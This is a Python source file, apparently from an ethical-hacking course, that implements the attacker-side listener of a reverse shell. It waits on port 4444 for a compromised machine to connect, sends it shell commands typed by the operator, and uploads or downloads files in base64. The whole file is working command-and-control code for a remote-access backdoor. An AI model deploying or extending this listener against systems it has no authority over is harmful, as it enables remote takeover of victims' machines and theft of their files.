# Many thanks to thenewboston, zaid sabih, and udemy.com
# Created by foxsinofgreed
import socket, json, os
import base64


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = self.listener.accept()
        print("[+] Accepted connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = bytes(json_data, 'utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024), 'utf-8')
                json_data = json.loads(json_data)
                break
            except json.decoder.JSONDecodeError:
                continue

        return json_data

    def readfiles(self, path):
        with open(path, 'rb') as file:
            print("file " + path)
            # rb because we wanna read file as binary
            content = file.read()
            print("content\n" + str(content))
            content = base64.b64encode(content)
            print("content\n"+str(content))
            content = str(content)
            return content

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            content = content[2:-1]
            content = base64.b64decode(content)
            file.write(content)
            try:
                return "[+] Written to file\n" + path + "\ncontent\n" + str(content) + "\nDownload Complete\n"
            except:
                return "[+] Written to file\n" + path + "\nDownload Complete\n"

    def exec_remote(self, command):
        command_list = command.split(" ")

        try:
            if command_list[0] == "upload":
                command = command + " " + self.readfiles(command_list[1])
                print(command)

            self.reliable_send(command)

            if command_list[0] == "quit" or command_list[0] == "exit":
                self.listener.close()
                exit(0)

            result = self.reliable_receive()

            if command_list[0] == "download" and "[-] Error" not in result:
                result = self.write_file(command_list[1], result)
        except Exception as exception:
            result = "[-] Error. Something went wrong"

        return result

    def run(self):
        while True:
            command = input("#>")
            result = self.exec_remote(command)
            print(result)


my_listener = Listener("127.0.0.1", 4444)
my_listener.run()
